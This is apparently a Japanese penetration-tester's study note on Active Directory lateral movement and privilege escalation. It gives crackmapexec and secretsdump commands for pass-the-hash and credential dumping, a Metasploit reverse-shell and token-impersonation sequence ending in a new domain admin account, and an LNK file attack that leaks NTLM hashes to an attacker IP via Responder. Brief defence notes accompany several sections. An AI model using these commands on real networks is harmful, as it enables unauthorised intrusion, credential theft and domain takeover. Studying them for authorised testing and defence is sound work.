
 

- すでに何かしらの認証情報でログインできた後に、横展開や権限昇格時に行うこと
# Pass The Password・Pass The Hash
- 両方とも同じで、認証情報を他のマシンで使い回すことを利用する攻撃手法

## Pass The Password
認証情報を取得したときに、その認証情報が他のマシンでも使われていることがある
- 認証情報とネットワーク範囲・ドメインを指定することで、一括ですでに手に入れた認証情報でログインできるマシンを洗いだせる
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -p <pass>
```

## Pass The Hash
PassThe Hashは、Pass The Passwordのハッシュ版

まず、取得した認証情報でハッシュをダンプする
```sh
secretsdump.py <domain>/<user>:<Password>@ターゲットマシンIP
```
Metasploit
```
use windows/smb/psexec
# meterpreter接続後
meterpreter > hashdump
```

Pass The Hash攻撃
- ネットワーク範囲で指定
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -H <取得したハッシュ>
```

攻撃例
![](https://i.imgur.com/oP8zP77.png)

そして、オプションをつけることで、crackmapexecからSAMに含まれているハッシュをダンプすることもできる
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -H <取得したハッシュ>　--local-auth --sam
```

LSASSに含まれている資格情報をダンプするコマンド
- mimikatzの主な攻撃対象
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -H <取得したハッシュ>　--local-auth -M lsassy
```

共有も列挙できる
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -H <取得したハッシュ> --local-auth --shares
```

- `crackmapexec smb -L` 
	- crackmapexecのモジュール一覧検索
	- Keepassファイルの探索
		- `-M keepass_discover`
	- GPPパスワードの探索
		- `-M gpp_password`
	- WDigest認証の設定を確認し、メモリに平文パスワードが残っているかを探る
		-  古い脆弱性プロトコル
		- Windows 7, 8, 2008 R2, Server 2012でデフォルトで使用されていた
		- ドメイン管理者がログインしていると、パスワードを平文で取得できる
		- `-M wdigest`
	- インターネットの認証情報とSSID
		- `-M wireless`
`cmedb`
- 今まで取得した認証情報をdbとして確認できる
- `hosts` : 今までのHOST
- `creds` : 今まで取得した認証情報・ハッシュ

### 取得するべきアカウント
取得すべきは、ユーザーアカウントと管理者アカウント
- 「DefaultAccount」と「WDAGUtilityAccount」は意味がないので無視


## 対策
### アカウントの使い回しの制限
- ベストプラクティス
- ゲスト管理者アカウントの無効化
- ローカル管理者を制限する

### 強力なパスワードの使用
 - 長ければ長いほど良い（14文字以上）
 - よく使われる単語は避ける
	 - 文章をそのままパスワードにするのがおすすめ
 - しかし、これだけではPass The Hashを防げない　

###  特権アクセス管理（PAM）
- PAM : Plivilege Account Managementの略
-  必要に応じて機密アカウントをチェックアウト/チェックインする
	- **チェックイン**
		- 管理者や特定のユーザーが、一時的に機密アカウント（例：Windows管理者アカウントやDBのrootアカウント）を使いたいとき、そのアカウントの認証情報（パスワードなど）を「借りる」行為
	- **チェックアウト**
		- 使用が終わったら「返却」し、ツール側でパスワードを自動変更して再保護
	- 具体的なツール
		- CyberArk・Linea・Thycoticのようなツール
	- 利点
		- 管理者アカウントの認証情報が自動的に変更されるから、攻撃を大幅に制限できる
	- ハッシュ/パスワードが強固かつ定期的に更新されるため、パスワード攻撃を制限できる
	- 適切な設定
		- 貸したアカウントの有効期限が長過ぎないことなど

# Kerberoasting
- 要は、SPN付きのTGS (Ticket Granted Service : チケット発行サービスが発行するチケット) を取得して、クラックして、認証情報取得できたらラッキーみたいな感じよね
- で、TGT/TGSをそのままマシンに認証するのが、PtTって認識でおけ？

この攻撃ができるロジック
流れ
	1.	ADにログインできるユーザーなら誰でも…
	2.	GetUserSPNs.py や Rubeus などを使って、SPNを持つユーザーのTGSを要求できる
	3.	取得したTGSにはサービスアカウントの**パスワードのRC4-HMAC(NTLMハッシュの派生)ハッシュ**が含まれている
		- 本来は、TGSでアクセスした時に、渡したサーバー側で、TGSを複合化して、TGSの正当性を確かめる。
		- だが、攻撃者はこれを利用する
	4.	これを john や hashcat でクラック
	5.	成功すれば、サービスアカウントのパスワードがゲットできる！

攻撃手法
[[CheatSheet/Active Directory#Kerberoasting|Active Directory]]

## 対策
- 強いパスワード
	- サービスアカウントのパスワードをADの説明欄に書かない
- 最小権限に従う
	- サービスアカウントをドメイン管理者権限にするべきではない

# トークンなりすまし攻撃
- トークンとは
	- デリゲートトークン
		- 一般的にマシンにログインしたり、RDPでのログインで使われるトークン
	- なりすましトークン
		- インタラクティブでないトークン
		- スクリプトなどを作成して、それを使って共有フォルダにアクセスする時のトークン

ここではデリデートトークンをなりすます
- で、なりまして、ドメイン管理者として、コマンドを実行できたら、新しいアカウントを作ることで確立する

仕組み
- ユーザーがログオンすると、**アクセストークン**が発行される
- 他のプロセスやサービスがそのユーザーのトークンを「開いたまま持っている」と、それを**借りて（impersonate）なりすまし**ができる

## 攻撃手法

### Metasploit
まずは、metapreterシェルを設定する ( msfconsole内
```sh
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
# RHOSTは、AD参加ホストであればなんでも。DC以外でも良い。
set RHOSTS <AD参加ホストIP>
set smbuser <ユーザーネーム>
set smbpass <パスワード>
set smbdomain <ドメイン名>
set LHOST 
```

以下 meterpreter内で実行
上で、シェルが確立できた後 、なりすましをするためのモジュールをロードする
```sh
meterpreter > load incognito
```

ユーザー（user）に絞って表示、なりすまし可能なトークンを列挙する
- ここまでで、どのアカウントになり済ますべきか、知っているべき
```sh
meterpreter > list_tokens -u
```

なりすますユーザーを指定し、なりすます
 - この時、スラッシュを二つつける
	 - 例 : MARVEL\\fcastle
```sh
meterpreter > impersonate_token <なりすますユーザー名>
meterpreter > shell
whoami
```

高い権限でなりすましができた後に、その権限でユーザーを新しく作成する
そして、作成したアカウントで、もう一度`secretsdump.py`などでハッシュをダンプすると、全てのハッシュを取得できる
```windows shell
net user /add <ユーザーネーム> <パスワード> /domain
net group "Domain Admins" <ユーザーネーム> /ADD /DOMAIN
```

ちなみに、loadだけ入力することで、他のモジュールや拡張機能についてもみれる
その中の「kiwi」は、mimikatzの派生みたいな感じ

### 対策
- ユーザー／グループのトークン作成権限を制限する
- アカウント階層化（Account Tiering）を行う
	- ベストプラクティス
- ローカル管理者権限の制限


# LNK File Attack
- 水飲み場攻撃の一種
- 権限を昇格させたり、管理者のハッシュを取得したい場合など
	- 管理者など高権限ユーザーの NTLMハッシュを取得
	- SMBリレーやパスワードクラックなどに繋げる
- 特に共有フォルダ（社内ファイル共有）が攻撃経路になる

攻撃の流れ（3ステップ）

1. 悪意ある .lnk（ショートカット）ファイルを作る
	- .lnk ファイルは、アイコンやリンク先などに**リソース参照先、UNCパス**を指定できる
	- 例： `\\ATTACKER_IP\icon.ico`
	- Windowsはアイコン表示のためにこのリモートパスに勝手にアクセスする！

.Inkファイルの作成コマンド
- この時に、作成する.lnkファイル名の接頭辞に「@」か「~」をつける
	- こうすることで、エクスプローラーで表示した時に、上の方に出てきて、windowsに勝手に実行されやすくなる
```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("<ADの共有フォルダ>\@test.lnk")
$lnk.TargetPath = "\\<攻撃者のIP>\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

2. その .lnk ファイルを共有フォルダに置く
	- 社内共有フォルダやホームドライブなど、誰かが開く可能性のある場所に配置
	- 例えば：`\\fileserver\public\Project2025Shortcut.lnk`

3. KaliでResponderを立ち上げ、接続を待つ
```sh
sudo responder -I eth0 -dPv
```

4. 管理者が .lnk ファイルを表示 or アクセスした瞬間、NTLMハッシュが送信される
	- 被害者のマシンは `\\ATTACKER_IP\icon.ico` に自動アクセス
	- 攻撃者側（例：Kali Linux）で Responder を起動していれば、
→ SMB認証を試みるNTLMv2ハッシュがキャプチャできる

つまりこういうこと
- ファイルを開かなくても、エクスプローラーで一覧表示しただけでアウト！
- .lnk のアイコンロード時点で SMB通信が発生 → NTLMハッシュが飛ぶ
- それをResponderやInveighでキャプチャして使う

.lnkファイルの自動作成ツール
- 以下のコマンドで、.inkファイルを作成して、公開共有ホストにおいてくれる。攻撃者がやるのはResponderで待機することだけになる
```sh
netexec smb <AD参加ホスト> -d <ドメイン名> -u <ユーザー名> -p <パスワード> -M slinky -M slinky -o NAME=test SERVER=<攻撃者IP>
```

# グループポリシー設定（GPP）によるパスワードの漏洩
[[Pentest_Technique/Active Directory#グループポリシー設定（GPP）によるパスワードの漏洩]]


# Mimikatz

# 侵害後の攻撃戦略

 アカウントを手に入れた、さて次は？

 まずは「Quick Wins」を試せ
 常に同時並行で進めろ
- Kerberoasting
- Secretsdump（資格情報の抽出）
- Pass the hash / Pass the password（パスハッシュ・パスワードの再利用）

NO Quick Wins？なら深掘りだ！
- 列挙（BloodHoundなどを使う）
- そのアカウントはどこにアクセスできる？
- 古い脆弱性はしぶとく残っている

発想を変えて攻めてみろ（Think outside the box）